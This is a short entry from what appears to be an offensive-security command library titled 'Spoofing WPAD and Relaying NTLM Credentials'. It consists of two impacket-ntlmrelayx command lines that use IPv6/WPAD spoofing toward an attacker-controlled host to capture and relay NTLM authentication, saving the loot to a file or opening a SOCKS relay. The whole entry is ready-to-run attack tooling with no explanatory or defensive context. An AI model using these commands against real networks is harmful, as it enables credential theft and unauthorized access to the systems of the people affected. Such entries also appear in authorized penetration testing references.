---
id: a403ec97-1485-4d8a-8d09-319d2a6e2c45
name: Spoofing WPAD and Relaying NTLM Credentials
type: command
executor: bash
data: 'impacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt

  impacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug'
output: null
created_at: '2023-04-06T03:56:05.464313+00:00'
updated_at: '2023-04-10T20:25:58.237494+00:00'
---

# Spoofing WPAD and Relaying NTLM Credentials

```bash
impacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt
impacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug
```
